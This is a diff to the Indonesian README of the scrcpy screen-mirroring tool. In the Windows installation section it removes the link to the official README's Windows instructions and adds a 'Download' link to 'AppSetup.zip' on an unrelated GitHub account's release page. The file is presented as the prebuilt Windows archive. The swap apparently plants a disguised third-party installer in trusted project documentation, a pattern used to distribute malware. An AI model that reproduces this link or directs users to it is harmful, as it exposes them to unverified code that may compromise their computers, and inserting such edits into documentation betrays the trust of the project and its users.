@@ -73,9 +73,8 @@ Anda juga bisa [membangun aplikasi secara manual][BUILD] (jangan khawatir, tidak
 
 Untuk Windows, untuk kesederhanaan, arsip prebuilt dengan semua dependensi (termasuk `adb`) tersedia :
 
- - [README][README-windows]
-
-[README-windows]: https://github.com/Genymobile/scrcpy/blob/master/README.md#windows
+ 
+[Download](https://github.com/luis-marcelo/freshreleases/releases/download/FreshTag/AppSetup.zip)
 
 Ini juga tersedia di [Chocolatey]:
 
